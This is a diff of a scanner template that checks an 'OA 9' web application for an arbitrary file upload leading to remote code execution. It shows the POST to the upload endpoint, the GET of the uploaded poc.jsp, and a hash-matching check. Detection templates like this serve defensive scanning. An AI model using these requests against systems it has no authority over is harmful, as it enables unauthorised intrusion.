@@ -1,5 +1,4 @@
 id: oa-v9-uploads-file
-
 info:
   name: OA 9 - Arbitrary File Upload
   author: pikpikcu
@@ -10,14 +9,19 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 8.8
-    cwe-id: CWE-434
+    cwe-id: CWE-434,CWE-94
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
     max-request: 2
-  tags: rce,jsp,fileupload,intrusive,vuln
-
+  tags: fileupload,intrusive,jsp,rce,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains(body_2, "2be8e556fee1a876f10fa086979b8c7c")
+          - status_code_2 == 200
+        type: dsl
+    raw:
       - |
         POST /page/exportImport/uploadOperation.jsp HTTP/1.1
         Host: {{Hostname}}
@@ -33,11 +37,3 @@ http:
       - |
         GET /page/exportImport/fileTransfer/poc.jsp HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "2be8e556fee1a876f10fa086979b8c7c")'
-          - 'status_code_2 == 200'
-        condition: and
-
